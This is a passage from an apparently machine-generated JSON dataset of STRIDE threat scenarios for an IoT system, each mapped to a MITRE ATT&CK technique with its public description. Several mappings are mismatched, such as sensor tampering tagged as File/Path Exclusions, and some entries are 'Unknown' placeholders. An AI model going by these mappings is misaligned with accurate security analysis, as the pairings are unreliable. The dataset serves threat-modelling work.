                    "Role": "System Designer",
                    "Condition": "Lenient access control and auditing policies."
                }
            ],
            "Potential Impact": "Unauthorized administrative access to cloud resources and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud misconfiguration",
                "higher-level access",
                "cloud security",
                "privilege exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user device to gain unauthorized access to the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanism or exploitable vulnerability in the authentication process",
                    "Role": "Attacker",
                    "Condition": "Attack tools available to exploit weak authentication"
                },
                {
                    "Assumption": "User device is not secured with multi-factor authentication",
                    "Role": "User",
                    "Condition": "User opts for less secure methods"
                },
                {
                    "Assumption": "Network traffic is not encrypted",
                    "Role": "Network Administrator",
                    "Condition": "Administrator configures network without encryption"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and control over the IoT environment.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Authentication Bypass",
                "User Device",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a valid sensor to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "System lacks robust verification for sensor messages",
                    "Role": "System Designer",
                    "Condition": "Design prioritizes performance over security"
                },
                {
                    "Assumption": "Sensor communication is not encrypted",
                    "Role": "Network Administrator",
                    "Condition": "Administrator configures network without encryption"
                },
                {
                    "Assumption": "Malicious actor has physical access to the environment",
                    "Role": "Attacker",
                    "Condition": "Insider threat or lack of physical security measures"
                }
            ],
            "Potential Impact": "Corruption of environment data, leading to incorrect system responses.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Sensor Data Injection",
                "System Integrity",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious software mimics legitimate applications to capture user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users are not aware of the threat of malicious software",
                    "Role": "User",
                    "Condition": "Users download apps from untrusted sources"
                },
                {
                    "Assumption": "Lack of proper application security vetting processes",
                    "Role": "Application Store Manager",
                    "Condition": "Store does not enforce strict security policies"
                },
                {
                    "Assumption": "System does not monitor and revoke suspicious devices quickly",
                    "Role": "Security Administrator",
                    "Condition": "Monitoring and response protocols are not robust"
                }
            ],
            "Potential Impact": "Unauthorized access to user credentials, leading to a broad range of attacks.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Theft",
                "Malicious Software",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data in transit between sensors and the data repository.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted",
                    "Role": "Network Administrator",
                    "Condition": "Administrator configures network without encryption"
                },
                {
                    "Assumption": "System does not use integrity checks",
                    "Role": "System Designer",
                    "Condition": "System designed without data integrity mechanisms"
                },
                {
                    "Assumption": "Network traffic is not monitored for unauthorized changes",
                    "Role": "Security Team",
                    "Condition": "Inadequate network monitoring"
                }
            ],
            "Potential Impact": "Compromise of data integrity leading to incorrect AI/ML model decisions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Integrity",
                "Network",
                "Sensor Communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to physical sensors and alters their configuration.",
            "Assumptions": [
                {
                    "Assumption": "Physical security of sensors is weak",
                    "Role": "Facility Manager",
                    "Condition": "Facility lacks proper access controls"
                },
                {
                    "Assumption": "Sensor configuration is not protected by strong authentication",
                    "Role": "System Designer",
                    "Condition": "Design does not require robust admin authentication"
                },
                {
                    "Assumption": "No alerts for unauthorized physical access to sensors",
                    "Role": "Security Team",
                    "Condition": "Monitoring system lacks physical access alerts"
                }
            ],
            "Potential Impact": "Incorrect behavior of the environment and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Physical Access",
                "Sensor Configuration",
                "System Behavior"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware alters the machine learning models or their parameters in the cloud repository.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not properly secured",
                    "Role": "Cloud Administrator",
                    "Condition": "Cloud security misconfigurations"
                },
                {
                    "Assumption": "Update channels for ML models are not authenticated",
                    "Role": "System Designer",
                    "Condition": "Lax update mechanisms"
                },
                {
                    "Assumption": "No integrity checks for the models",
                    "Role": "AI/ML Developer",
                    "Condition": "System lacks validation of model integrity"
                }
            ],
            "Potential Impact": "Compromised AI decision-making processes leading to system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Machine Learning",
                "Cloud Repository",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having performed an action on the system, such as changing settings or triggering events.",
            "Assumptions": [
                {
                    "Assumption": "System lacks detailed audit logs for user actions",
                    "Role": "System Designer",
                    "Condition": "Design omits comprehensive logging"
                },
                {
                    "Assumption": "Audit logs can be tampered with",
                    "Role": "Security Administrator",
                    "Condition": "Logs are not stored securely"
                },
                {
                    "Assumption": "No multi-factor authentication for critical actions",
                    "Role": "User",
                    "Condition": "System allows single-factor authentication"
                }
            ],
            "Potential Impact": "Difficulty in attributing actions leads to security and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Audit Logs",
                "User Actions",
                "Multi-Factor Authentication"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attackers modify or delete log records to conceal their activities.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored with improper access controls",
                    "Role": "Security Administrator",
                    "Condition": "Logs stored in insecure locations"
                },
                {
                    "Assumption": "Logging mechanism lacks integrity protection",
                    "Role": "System Designer",
                    "Condition": "Designed without checksums or hash verifications"
                },
                {
                    "Assumption": "Log access is not monitored",
                    "Role": "Security Team",
                    "Condition": "Absence of SIEM solution or equivalent monitoring system"
                }
            ],
            "Potential Impact": "Concealed malicious activities, leading to challenges in incident detection and response.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Tampering",
                "Activity Concealment",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Admin changes system configurations and denies it to avoid accountability.",
            "Assumptions": [
                {
                    "Assumption": "Admin actions are not logged in detail",
                    "Role": "System Designer",
                    "Condition": "Logging mechanisms exclude admin actions"
                },
                {
                    "Assumption": "No mechanism for tamper-evident logs",
                    "Role": "Security Administrator",
                    "Condition": "Logs can be altered without detection"
                },
                {
                    "Assumption": "System does not require admin approval for configuration changes",
                    "Role": "System Administrator",
                    "Condition": "Designed for ease of access over security"
                }
            ],
            "Potential Impact": "Unaccounted and possibly malicious changes to the system configurations.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Admin Actions",
                "Configuration Changes",
                "Log Integrity"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during transmission due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted without encryption",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks end-to-end encryption"
                },
                {
                    "Assumption": "An attacker can monitor network traffic",
                    "Role": "Attacker",
                    "Condition": "Access to network sniffing tools and proximity to the network"
                },
                {
                    "Assumption": "No regular network audits",
                    "Role": "Security Team",
                    "Condition": "Lack of network monitoring practices"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Transmission",
                "Lack of Encryption",
                "Network Monitoring"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data stored in the cloud repository is exposed due to weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access control policies on cloud storage",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfigurations in access control settings"
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest",
                    "Role": "System Designer",
                    "Condition": "Data stored without encryption"
                },
                {
                    "Assumption": "Access logs are not regularly reviewed",
                    "Role": "Security Team",
                    "Condition": "Absence of periodic log audits"
                }
            ],
            "Potential Impact": "Exposed sensitive data leading to privacy breaches and potential financial loss.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud Storage",
                "Access Control",
                "Data Encryption"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "People with physical access to user devices extract sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack physical security",
                    "Role": "User",
                    "Condition": "Devices left unattended or unsecured"
                },
                {
                    "Assumption": "Sensitive data is stored in plaintext on devices",
                    "Role": "Application Developer",
                    "Condition": "Application stores data without encryption"
                },
                {
                    "Assumption": "Devices are not configured to lock automatically",
                    "Role": "User",
                    "Condition": "Automatic lock settings are disabled"
                }
            ],
            "Potential Impact": "Compromise of user privacy and potential misuse of personal information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "User Devices",
                "Physical Access",
                "Data Encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Lack of DDoS mitigation measures",
                    "Role": "Network Administrator",
                    "Condition": "No DDoS protection services configured"
                },
                {
                    "Assumption": "High reliance on internet connectivity for operations",
                    "Role": "System Designer",
                    "Condition": "Design without offline capabilities"
                },
                {
                    "Assumption": "No network traffic monitoring in place",
                    "Role": "Security Team",
                    "Condition": "Absence of network monitoring tools"
                }
            ],
            "Potential Impact": "Disruption of services and unavailability of the IoT application.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Communication Infrastructure",
                "Network Traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion on user devices due to malicious software looping operations.",
            "Assumptions": [
                {
                    "Assumption": "User devices are not equipped with resource management controls",
                    "Role": "Device Manufacturer",
                    "Condition": "Devices lack resource management features"
                },
                {
                    "Assumption": "Malicious software installed on user devices",
                    "Role": "User",
                    "Condition": "User installs applications from untrusted sources"
                },
                {
                    "Assumption": "No runtime monitoring for abnormal software behavior",
                    "Role": "Security Team",
                    "Condition": "System lacks runtime monitoring and alerts"
                }
            ],
            "Potential Impact": "Devices become unresponsive or slow, impacting user interactions.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Resource Exhaustion",
                "User Devices",
                "Malicious Software"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the data repository with overly large data sets, causing slowdowns and potential crashes.",
            "Assumptions": [
                {
                    "Assumption": "Database lacks rate limiting mechanisms",
                    "Role": "Database Administrator",
                    "Condition": "Rate limit configurations not implemented"
                },
                {
                    "Assumption": "No input validation for data size",
                    "Role": "Application Developer",
                    "Condition": "Product lacks data size validations"
                },
                {
                    "Assumption": "Monitoring system does not detect unusual data volumes",
                    "Role": "Security Team",
                    "Condition": "System not set to alert on abnormal data loads"
                }
            ],
            "Potential Impact": "Slow or unresponsive database affecting system performance and availability.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Data Repository",
                "Flooding",
                "Database Performance"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain admin rights on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Exposed vulnerabilities in the device's OS or applications",
                    "Role": "User",
                    "Condition": "Devices not updated with latest patches"
                },
                {
                    "Assumption": "User devices lack strong access control mechanisms",
                    "Role": "Device Manufacturer",
                    "Condition": "Devices designed without robust access controls"
                },
                {
                    "Assumption": "No malware detection systems on devices",
                    "Role": "User",
                    "Condition": "Lack of antivirus or anti-malware applications"
                }
            ],
            "Potential Impact": "Unauthorized actions on the device, including data manipulation and installation of additional malware.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Admin Rights",
                "OS Vulnerability",
                "User Devices"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting misconfigured cloud storage to gain access to sensitive data and modify access controls.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured access policies for cloud resources",
                    "Role": "Cloud Administrator",
                    "Condition": "Cloud service misconfigurations"
                },
                {
